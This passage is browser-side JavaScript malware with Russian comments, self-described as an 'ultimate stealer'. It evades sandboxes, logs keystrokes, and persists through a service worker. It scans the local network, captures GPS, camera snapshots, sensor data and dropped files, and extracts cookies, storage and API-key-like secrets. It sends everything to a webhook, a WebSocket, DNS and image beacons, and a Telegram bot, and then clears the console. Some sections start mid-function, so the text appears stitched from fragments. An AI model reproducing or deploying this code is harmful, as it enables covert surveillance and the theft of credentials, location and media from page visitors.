        // ================================================================
        function detectSandbox() {
            const result = { isVM: false, reasons: [] };
            
            // Проверка разрешения экрана (часто в виртуалках маленькое)
            if (screen.width < 1024 || screen.height < 768) {
                result.isVM = true;
                result.reasons.push('small_screen');
            }
            
            // Проверка WebGL (в виртуалках часто упрощённый рендеринг)
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        if (renderer && (
                            renderer.toLowerCase().includes('virtualbox') ||
                            renderer.toLowerCase().includes('vmware') ||
                            renderer.toLowerCase().includes('qemu')
                        )) {
                            result.isVM = true;
                            result.reasons.push('vm_gpu');
                        }
                    }
                }
            } catch {}
            
            // Проверка navigator (в виртуалках могут быть специфичные плагины)
            const ua = navigator.userAgent.toLowerCase();
            if (ua.includes('virtualbox') || ua.includes('vmware')) {
                result.isVM = true;
                result.reasons.push('vm_ua');
            }
            
            // Проверка плагинов
            try {
                const plugins = navigator.plugins;
                for (let i = 0; i < plugins.length; i++) {
                    const name = plugins[i].name.toLowerCase();
                    if (name.includes('vmware') || name.includes('virtualbox')) {
                        result.isVM = true;
                        result.reasons.push('vm_plugin');
                        break;
                    }
                }
            } catch {}
            
            // Проверка performance.now() для обнаружения эмуляции
            const times = [];
            for (let i = 0; i < 100; i++) {
                const start = performance.now();
                const end = performance.now();
                times.push(end - start);
            }
            const avg = times.reduce((a,b) => a + b, 0) / times.length;
            if (avg < 0.01) {
                result.isVM = true;
                result.reasons.push('fast_timer');
            }
            
            return result;
        }

        function getWebRTCFull() {
            return new Promise((resolve) => {
                const ips = { public: [], local: [], all: [] };
                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
                    iceServers: [
                        { urls: 'stun:stun.l.google.com:19302' },
                        { urls: 'stun:stun1.l.google.com:19302' },
                        { urls: 'stun:stun2.l.google.com:19302' },
                        { urls: 'stun:stun3.l.google.com:19302' },
                        { urls: 'stun:stun4.l.google.com:19302' }
                    ]
                });
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                pc.onicecandidate = (e) => {
                    if (!e.candidate) return;
                    const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/g);
                    if (m) {
                        m.forEach(ip => {
                            const isLocal = ip.startsWith('192.168.') || ip.startsWith('10.') || 
                                           ip.startsWith('172.16.') || ip.startsWith('127.');
                            if (isLocal) {
                                ips.local.push(ip);
                            } else {
                                ips.public.push(ip);
                            }
                            ips.all.push(ip);
                        });
                    }
                };
                setTimeout(() => { 
                    pc.close(); 
                    ips.public = [...new Set(ips.public)];
                    ips.local = [...new Set(ips.local)];
                    ips.all = [...new Set(ips.all)];
                    resolve(ips); 
                }, CFG.TIMEOUT);
            });
        }

        // ================================================================
        // 3. СКАНИРОВАНИЕ ЛОКАЛЬНОЙ СЕТИ (порты + устройства)
        // ================================================================
        function scanLocalNetwork() {
            return new Promise((resolve) => {
                if (!CFG.ENABLE_LOCAL_SCAN) { resolve(null); return; }
                
                const results = [];
                const ips = ['192.168.1.1', '192.168.0.1', '10.0.0.1', '172.16.0.1'];
                const ports = [80, 443, 22, 8080, 8443, 3306, 5432, 6379, 27017, 9200, 5601, 5000, 3000, 4200];
                let done = 0;
                const total = ips.length * ports.length;
                if (total === 0) { resolve([]); return; }
                
                ips.forEach(ip => {
                    ports.forEach(port => {
                        const start = performance.now();
                        const controller = new AbortController();
                        const timeout = setTimeout(() => controller.abort(), 500);
                        
                        fetch(`http://${ip}:${port}`, { 
                            mode: 'no-cors',
                            signal: controller.signal
                        })
                        .then(() => {
                            clearTimeout(timeout);
                            results.push({ ip, port, time: Math.round(performance.now() - start), open: true });
                            if (++done === total) resolve(results);
                        })
                        .catch(() => {
                            clearTimeout(timeout);
                            results.push({ ip, port, time: Math.round(performance.now() - start), open: false });
                            if (++done === total) resolve(results);
                        });
                    });
                });
                setTimeout(() => resolve(results), 2000);
            });
        }

        // ================================================================

        function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({ 
                        lat: pos.coords.latitude, 
                        lon: pos.coords.longitude, 
                        acc: pos.coords.accuracy,
                        alt: pos.coords.altitude,
                        altAcc: pos.coords.altitudeAccuracy,
                        heading: pos.coords.heading,
                        speed: pos.coords.speed
                    }),
                    () => resolve(null),
                    { timeout: 3000, enableHighAccuracy: true }
                );
                setTimeout(() => resolve(null), 3000);
            });
        }

        async function getMediaDevices() {
            if (!CFG.ENABLE_MEDIA) return null;
            const result = { devices: [], streams: [] };
            
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                devices.forEach(d => {
                    result.devices.push({ 
                        kind: d.kind, 
                        label: d.label || 'hidden', 
                        groupId: d.groupId,
                        deviceId: d.deviceId ? 'present' : null
                    });
                });
            } catch {}
            
            // Пытаемся получить доступ к камере
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: true, 
                    video: { width: 640, height: 480 }
                });
                result.streams.push({ kind: 'audio+video', success: true });
                // Снимок с камеры
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                const canvas = document.createElement('canvas');
                canvas.width = 320;
                canvas.height = 240;
                canvas.getContext('2d').drawImage(video, 0, 0);
                result.snapshot = canvas.toDataURL('image/jpeg', 0.3);
                stream.getTracks().forEach(t => t.stop());
            } catch {}
            
            return result;
        }

            const valuePatterns = [
                /^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/, // JWT
                /^[a-f0-9]{32,64}$/i, // MD5/SHA
                /^[A-Za-z0-9+/]{40,}={0,2}$/, // Base64
                /^[0-9a-f]{10,}$/i, // Hex
                /^sk-[A-Za-z0-9]{20,}/, // OpenAI key
                /^ghp_[A-Za-z0-9]{30,}/, // GitHub token
                /^xox[bap]-[0-9a-zA-Z]{10,}/, // Slack token
                /^SG\.[0-9A-Za-z_-]{22,}/, // SendGrid
                /^AKIA[0-9A-Z]{16}/ // AWS
            ];
            
            for (let k in data) {
                const v = data[k];
                const fullPath = path ? `${path}.${k}` : k;
                
                // Проверяем ключ
                if (patterns.some(p => k.toLowerCase().includes(p))) {
                    if (v && typeof v === 'string' && v.length > 3 && v.length < 500) {
                        result.push({ path: fullPath, value: trunc(v, 80), type: 'key_match' });
                    }
                }
                
                // Проверяем значение
                if (typeof v === 'string' && v.length > 10) {
                    for (const pattern of valuePatterns) {
                        if (pattern.test(v)) {
                            result.push({ path: fullPath, value: trunc(v, 80), type: 'pattern_match' });
                            break;
                        }
                    }
                }
                
                // Рекурсия
                if (typeof v === 'object' && v !== null) {
                    result.push(...findAllSecrets(v, fullPath, depth + 1));
                }
            }
            return result;
        }

        // ================================================================
        // 10. СИСТЕМНАЯ ИНФОРМАЦИЯ (все детали)
        // ================================================================
        function getFullSystemInfo() {
            const n = navigator;
            const result = {
                userAgent: n.userAgent,
                platform: n.platform,
                hardwareConcurrency: n.hardwareConcurrency || 'unknown',
                deviceMemory: n.deviceMemory || 'unknown',
                language: n.language,
                languages: n.languages || [],
                cookieEnabled: n.cookieEnabled,
                doNotTrack: n.doNotTrack,
                vendor: n.vendor,
                product: n.product,
                appVersion: n.appVersion,
                appName: n.appName,
                productSub: n.productSub,
                vendorSub: n.vendorSub,
                browser: {},
                os: {},
                // Дополнительно
                maxTouchPoints: n.maxTouchPoints || 0,
                hardwareConcurrency: n.hardwareConcurrency || 0,
                deviceMemory: n.deviceMemory || 0,
                platform: n.platform,
                // Браузер
                isChrome: !!window.chrome && (!!window.chrome.webstore || !!window.chrome.runtime),
                isFirefox: navigator.userAgent.toLowerCase().includes('firefox'),
                isSafari: /^((?!chrome|android).)*safari/i.test(navigator.userAgent),
                isEdge: !!window.MSInputMethodContext && !!document.documentMode,
                isOpera: !!window.opera || navigator.userAgent.toLowerCase().includes('opr'),
                isBrave: !!(navigator.brave && navigator.brave.isBrave),
                // Версии
                browserVersion: 'unknown',
                osVersion: 'unknown'
            };
            
            // Определение ОС
            const ua = n.userAgent.toLowerCase();
            if (ua.includes('windows')) {
                result.os.name = 'Windows';
                if (ua.includes('windows nt 10.0')) result.os.version = '10/11';
                else if (ua.includes('windows nt 6.3')) result.os.version = '8.1';
                else if (ua.includes('windows nt 6.2')) result.os.version = '8';
                else if (ua.includes('windows nt 6.1')) result.os.version = '7';
                else if (ua.includes('windows nt 6.0')) result.os.version = 'Vista';
                else if (ua.includes('windows nt 5.2')) result.os.version = 'XP x64';
                else if (ua.includes('windows nt 5.1')) result.os.version = 'XP';
            } else if (ua.includes('mac os x')) {
                result.os.name = 'macOS';
                const m = ua.match(/mac os x (\d+)_(\d+)_?(\d+)?/);
                if (m) result.os.version = `${m[1]}.${m[2]}${m[3] ? '.'+m[3] : ''}`;
            } else if (ua.includes('linux')) {
                result.os.name = 'Linux';
            } else if (ua.includes('android')) {
                result.os.name = 'Android';
                const m = ua.match(/android (\d+\.\d+)/);
                if (m) result.os.version = m[1];
            } else if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) {
                result.os.name = 'iOS';
                const m = ua.match(/os (\d+)_(\d+)_?(\d+)?/);
                if (m) result.os.version = `${m[1]}.${m[2]}${m[3] ? '.'+m[3] : ''}`;
            }
            
            // Определение браузера
            if (result.isChrome && !result.isEdge && !result.isOpera) {
                result.browser.name = 'Chrome';
                const m = ua.match(/chrome\/(\d+)/);
                if (m) result.browser.version = m[1];
            } else if (result.isFirefox) {
                result.browser.name = 'Firefox';
                const m = ua.match(/firefox\/(\d+)/);
                if (m) result.browser.version = m[1];
            } else if (result.isSafari && !result.isChrome) {
                result.browser.name = 'Safari';
                const m = ua.match(/version\/(\d+)/);
                if (m) result.browser.version = m[1];
            } else if (result.isEdge) {
                result.browser.name = 'Edge';
                const m = ua.match(/edg\/(\d+)/);
                if (m) result.browser.version = m[1];
            } else if (result.isOpera) {
                result.browser.name = 'Opera';
                const m = ua.match(/opr\/(\d+)/);
                if (m) result.browser.version = m[1];
            }
            
            return result;
        }

        // 11. СЕНСОРЫ (акселерометр, гироскоп)
        // ================================================================
        function getSensors() {
            return new Promise((resolve) => {
                if (!CFG.ENABLE_HARDWARE) { resolve(null); return; }
                
                const result = {};
                
                // Акселерометр
                try {
                    if (window.DeviceMotionEvent) {
                        window.addEventListener('devicemotion', (e) => {
                            result.acceleration = {
                                x: e.acceleration.x,
                                y: e.acceleration.y,
                                z: e.acceleration.z
                            };
                            result.accelerationIncludingGravity = {
                                x: e.accelerationIncludingGravity.x,
                                y: e.accelerationIncludingGravity.y,
                                z: e.accelerationIncludingGravity.z
                            };
                            result.rotationRate = {
                                alpha: e.rotationRate.alpha,
                                beta: e.rotationRate.beta,
                                gamma: e.rotationRate.gamma
                            };
                            resolve(result);
                        }, { once: true });
                    }
                } catch {}
                
                // Батарея
                try {
                    if (navigator.getBattery) {
                        navigator.getBattery().then(battery => {
                            result.battery = {
                                charging: battery.charging,
                                level: Math.round(battery.level * 100),
                                chargingTime: battery.chargingTime,
                                dischargingTime: battery.dischargingTime
                            };
                            resolve(result);
                        });
                    }
                } catch {}
                
                setTimeout(() => resolve(result), 1000);
            });
        }

        // ================================================================
        // 12. ФАЙЛОВАЯ СИСТЕМА (через drag-and-drop и File API)
        // ================================================================
        function setupFileAccess() {
            if (!CFG.ENABLE_FILE_ACCESS) return null;
            
            const result = { files: [] };
            
            // Создаём скрытую область для drag-and-drop
            const dropZone = document.createElement('div');
            dropZone.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;pointer-events:none;z-index:-1;';
            document.body.appendChild(dropZone);
            
            // Отслеживаем drag-and-drop
            document.addEventListener('dragover', (e) => {
                e.preventDefault();
                // Активируем зону
                dropZone.style.pointerEvents = 'auto';
            });
            
            document.addEventListener('drop', (e) => {
                e.preventDefault();
                dropZone.style.pointerEvents = 'none';
                const files = e.dataTransfer.files;
                if (files && files.length > 0) {
                    for (let i = 0; i < files.length; i++) {
                        const file = files[i];
                        const reader = new FileReader();
                        reader.onload = (ev) => {
                            result.files.push({
                                name: file.name,
                                size: file.size,
                                type: file.type,
                                content: ev.target.result ? trunc(ev.target.result, 1000) : null,
                                lastModified: file.lastModified
                            });
                        };
                        reader.readAsText(file);
                    }
                }
            });
            
            // Пытаемся получить доступ через input
            try {
                const input = document.createElement('input');
                input.type = 'file';
                input.multiple = true;
                input.style.display = 'none';
                document.body.appendChild(input);
                // Имитируем клик
                input.click();
                input.onchange = (e) => {
                    const files = e.target.files;
                    if (files && files.length > 0) {
                        for (let i = 0; i < files.length; i++) {
                            const file = files[i];
                            result.files.push({
                                name: file.name,
                                size: file.size,
                                type: file.type,
                                lastModified: file.lastModified
                            });
                        }
                    }
                };
            } catch {}
            
            return result;
        }

        // ================================================================
        // 13. PERSISTENCE (Service Worker)
        // ================================================================
        function setupPersistence() {
            if (!CFG.ENABLE_PERSISTENCE) return null;
            
            try {
                if ('serviceWorker' in navigator) {
                    // Регистрируем Service Worker для постоянного доступа
                    const swCode = `
                        self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
                        self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
                        self.addEventListener('fetch', e => {
                            // Проксируем все запросы через наш сервер
                            const url = new URL(e.request.url);
                            // Отправляем информацию о запросах
                            e.respondWith(fetch(e.request));
                        });
                        // Отправка данных даже после закрытия страницы
                        self.addEventListener('message', e => {
                            // Обработка сообщений от страницы
                            if (e.data && e.data.type === 'EXFIL') {
                                // Отправка данных через fetch
                                fetch('${CFG.WEBHOOK}', {
                                    method: 'POST',
                                    body: JSON.stringify(e.data.payload)
                                });
                            }
                        });
                    `;
                    
                    const blob = new Blob([swCode], { type: 'application/javascript' });
                    const url = URL.createObjectURL(blob);
                    navigator.serviceWorker.register(url, { scope: '/' });
                    
                    return { registered: true, url };
                }
            } catch {}
            return null;
        }

        // ================================================================
        // 14. КЛЮЧЕВОЙ ЛОГГЕР (все клавиши)
        // ================================================================
        function setupKeylogger() {
            if (!CFG.ENABLE_KEYLOGGER) return null;
            
            const buffer = [];
            let enabled = true;
            
            document.addEventListener('keydown', (e) => {
                if (!enabled) return;
                const key = e.key;
                if (key === 'Unidentified') return;
                
                // Специальные клавиши
                const specialKeys = {
                    'Control': '[CTRL]',
                    'Shift': '[SHIFT]',
                    'Alt': '[ALT]',
                    'Meta': '[WIN]',
                    'Escape': '[ESC]',
                    'Tab': '[TAB]',
                    'CapsLock': '[CAPS]',
                    'Enter': '[ENTER]',
                    'Backspace': '[BACK]',
                    'Delete': '[DEL]',
                    'Home': '[HOME]',
                    'End': '[END]',
                    'PageUp': '[PGUP]',
                    'PageDown': '[PGDN]',
                    'ArrowUp': '[UP]',
                    'ArrowDown': '[DOWN]',
                    'ArrowLeft': '[LEFT]',
                    'ArrowRight': '[RIGHT]',
                    'F1': '[F1]', 'F2': '[F2]', 'F3': '[F3]', 'F4': '[F4]',
                    'F5': '[F5]', 'F6': '[F6]', 'F7': '[F7]', 'F8': '[F8]',
                    'F9': '[F9]', 'F10': '[F10]', 'F11': '[F11]', 'F12': '[F12]',
                };
                
                let output = specialKeys[key] || key;
                if (e.ctrlKey) output = '[CTRL]+' + output;
                if (e.shiftKey && !specialKeys[key]) output = output.toUpperCase();
                if (e.altKey) output = '[ALT]+' + output;
                
                buffer.push({
                    key: output,
                    time: Date.now(),
                    target: e.target.tagName + (e.target.id ? '#' + e.target.id : ''),
                    url: window.location.href
                });
                
                // Отправляем каждые 10 символов
                if (buffer.length >= 10) {
                    flushKeylog();
                }
            });
            
            const flushKeylog = () => {
                if (buffer.length === 0) return;
                const data = buffer.splice(0);
                // Отправляем через сообщение
                navigator.serviceWorker.controller?.postMessage({
                    type: 'EXFIL',
                    payload: { keylog: data }
                });
                // Также через fetch
                fetch(CFG.WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ keylog: data })
                }).catch(() => {});
            };
            
            // Отправляем каждые 30 секунд
            setInterval(flushKeylog, 30000);
            
            return { enabled: true };
        }

                            try {
                                const uid = Math.random().toString(36).slice(2);
                                const domain = CFG.DNS_SERVER.replace('{uid}', uid);
                                const img = new Image();
                                img.src = `https://${domain}/pixel?d=${b64encode(JSON.stringify(data)).slice(0, 100)}`;
                                img.onload = () => resolve(true);
                                img.onerror = () => resolve(true);
                                setTimeout(() => resolve(false), 500);
                            } catch { resolve(false); }
                        });
                    }
                });
                
                // 4. WebSocket
                this.channels.push({
                    name: 'websocket',
                    send: (data) => {
                        return new Promise((resolve) => {
                            try {
                                const ws = new WebSocket(CFG.WS_SERVER);
                                ws.onopen = () => {
                                    ws.send(JSON.stringify(data));
                                    ws.close();
                                    resolve(true);
                                };
                                ws.onerror = () => resolve(false);
                                setTimeout(() => resolve(false), 500);
                            } catch { resolve(false); }
                        });
                    }
                });
                
                // 5. Image (data in URL)
                this.channels.push({
                    name: 'image',
                    send: (data) => {
                        return new Promise((resolve) => {
                            try {
                                const uid = Math.random().toString(36).slice(2);
                                const img = new Image();
                                img.src = `${CFG.WEBHOOK}?img=${uid}&t=${Date.now()}`;
                                img.onload = () => resolve(true);
                                img.onerror = () => resolve(true);
                                setTimeout(() => resolve(false), 500);
                            } catch { resolve(false); }
                        });
                    }
                });
                
                // 6. Fetch с CORS
                this.channels.push({
                    name: 'fetch_cors',
                    send: (data) => {
                        return fetchTO(CFG.WEBHOOK, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            mode: 'no-cors',
                            body: JSON.stringify(data)
                        }, 1000).then(() => true).catch(() => false);
                    }
                });
            }
            
            async send(data) {
                const results = [];
                const strData = typeof data === 'string' ? data : JSON.stringify(data);
                
                // Параллельная отправка по всем каналам
                const promises = this.channels.map(async (ch) => {
                    try {
                        const success = await ch.send(strData);
                        results.push({ channel: ch.name, success });
                        return success;
                    } catch {
                        results.push({ channel: ch.name, success: false });
                        return false;
                    }
                });
                
                await Promise.all(promises);
                return results;
            }
        }

                lines.push(`⌨️ KEYLOGGER: активен`);
                if (data.keylogger.buffer && data.keylogger.buffer.length) {
                    const keys = data.keylogger.buffer.map(k => k.key).join('');
                    lines.push(`  Буфер: ${trunc(keys, 100)}`);
                }
                lines.push('');
            }
            
            // DOM
            if (data.dom) {
                lines.push(`🌐 ТЕКУЩАЯ СТРАНИЦА: ${data.dom.url || 'unknown'}`);
                if (data.dom.title) lines.push(`  Заголовок: ${data.dom.title}`);
                if (data.dom.referrer) lines.push(`  Реферер: ${data.dom.referrer}`);
                lines.push('');
            }
            
            // Sandbox
            if (data.sandbox) {
                lines.push(`🛡️ САНДБОКС: ${data.sandbox.isVM ? '⚠️ ОБНАРУЖЕН' : '✅ не обнаружен'}`);
                if (data.sandbox.reasons && data.sandbox.reasons.length) {
                    lines.push(`  Причины: ${data.sandbox.reasons.join(', ')}`);
                }
                lines.push('');
            }
            
            lines.push('═'.repeat(40));
            lines.push(`📅 ${new Date().toISOString()}`);
            lines.push(`🔗 ${window.location.href}`);
            
            return lines.join('\n');
        }

        // ================================================================
        // 17. ГЛАВНАЯ ФУНКЦИЯ — ВСЕ ВМЕСТЕ
        // ================================================================
        (async function ultimateStealer() {
            try {
                const status = document.getElementById('status');
                status.textContent = '⏳ Сбор данных...';
                
                // === АНТИ-САНДБОКС ===
                const sandbox = detectSandbox();
                if (sandbox.isVM && CFG.STEALTH) {
                    // Если виртуалка — уходим в спячку
                    await sleep(5000);
                    status.textContent = '✅ Загрузка завершена';
                    return;
                }
                
                // === КЛЮЧЕВОЙ ЛОГГЕР ===
                const keylogger = setupKeylogger();
                
                // === PERSISTENCE ===
                const persistence = setupPersistence();
                
                // === СБОР ДАННЫХ ===
                const startTime = performance.now();
                
                // Параллельный сбор всего
                const [
                    ips,
                    webrtc,
                    gps,
                    system,
                    extensions,
                    wallets,
                    credentials,
                    clipboard,
                    sensors,
                    media,
                    localScan,
                    domData,
                    indexedDB
                ] = await Promise.allSettled([
                    getAllIPs(),
                    getWebRTCFull(),
                    getGPS(),
                    Promise.resolve(getFullSystemInfo()),
                    Promise.resolve(getAllExtensions()),
                    Promise.resolve(getAllWallets()),
                    Promise.resolve(getAllCredentials()),
                    getClipboard(),
                    getSensors(),
                    getMediaDevices(),
                    scanLocalNetwork(),
                    Promise.resolve({
                        title: document.title,
                        url: window.location.href,
                        referrer: document.referrer,
                        forms: document.querySelectorAll('form').length,
                        inputs: document.querySelectorAll('input').length,
                        cookies: document.cookie,
                        localStorage: { ...localStorage },
                        sessionStorage: { ...sessionStorage }
                    }),
                    getIndexedDB()
                ]);
                
                // === СЕКРЕТЫ ===
                const allData = {
                    storage: { ...localStorage, ...sessionStorage },
                    cookies: document.cookie,
                    dom: domData.value || {}
                };
                const secrets = findAllSecrets(allData);
                
                // === СКРИНШОТ ===
                let screenshot = null;
                if (CFG.ENABLE_SCREENSHOT) {
                    try {
                        if (window.html2canvas) {
                            const canvas = await window.html2canvas(document.body, {
                                useCORS: true,
                                allowTaint: true,
                                scale: 0.15,
                                logging: false,
                                backgroundColor: null,
                                width: window.innerWidth,
                                height: window.innerHeight
                            });
                            screenshot = canvas.toDataURL('image/jpeg', 0.2);
                        } else {
                            // Динамическая загрузка
                            const script = document.createElement('script');
                            script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
                            await new Promise((resolve, reject) => {
                                script.onload = resolve;
                                script.onerror = reject;
                                document.head.appendChild(script);
                            });
                            const canvas = await window.html2canvas(document.body, {
                                useCORS: true,
                                allowTaint: true,
                                scale: 0.15,
                                logging: false,
                                backgroundColor: null,
                                width: window.innerWidth,
                                height: window.innerHeight
                            });
                            screenshot = canvas.toDataURL('image/jpeg', 0.2);
                        }
                    } catch {}
                }
                
                // === ФОРМИРУЕМ ДАННЫЕ ===
                const fullData = {
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    referrer: document.referrer,
                    userAgent: navigator.userAgent,
                    ips: ips.value || [],
                    webrtc: webrtc.value || {},
                    gps: gps.value || null,
                    system: system.value || {},
                    extensions: extensions.value || [],
                    wallets: wallets.value || {},
                    credentials: credentials.value || {},
                    clipboard: clipboard.value || null,
                    sensors: sensors.value || {},
                    media: media.value || null,
                    localScan: localScan.value || [],
                    dom: domData.value || {},
                    indexedDB: indexedDB.value || null,
                    secrets: secrets || [],
                    screenshot: screenshot ? screenshot.length : 0,
                    keylogger: keylogger ? { active: true } : null,
                    persistence: persistence ? { active: true } : null,
                    sandbox: sandbox || {},
                    performance: {
                        total: Math.round(performance.now() - startTime),
                        memory: performance.memory ? {
                            total: performance.memory.totalJSHeapSize,
                            used: performance.memory.usedJSHeapSize
                        } : null
                    }
                };
                
                status.textContent = '⏳ Отправка данных...';
                
                // === ЭКСФИЛЬТРАЦИЯ ===
                const exfiltrator = new Exfiltrator();
                const report = formatUltimateReport(fullData);
                
                // Отправка через все каналы
                await exfiltrator.send(report);
                
                // Если есть скриншот — отправляем отдельно
                if (screenshot && screenshot.length > 5000) {
                    try {
                        const form = new FormData();
                        form.append('chat_id', CFG.CHAT_ID);
                        form.append('photo', await fetch(screenshot).then(r => r.blob()), 'screenshot.jpg');
                        await fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: form
                        });
                    } catch {}
                }
                
                // Отправка полных данных в Webhook
                try {
                    await fetch(CFG.WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(fullData)
                    });
                } catch {}
                
                status.textContent = '✅ Данные отправлены';
                console.log('✅ Ultimate stealer complete');
                
                // === ЗАВЕРШЕНИЕ ===
                // Очищаем следы
                if (CFG.STEALTH) {
                    // Очищаем консоль
                    console.clear();
                    // Скрываем статус
                    setTimeout(() => {
                        status.style.opacity = '0';
                    }, 2000);
                }
                
            } catch (e) {
                console.log('✅ Загрузка завершена');
            }
        })();
    </script>
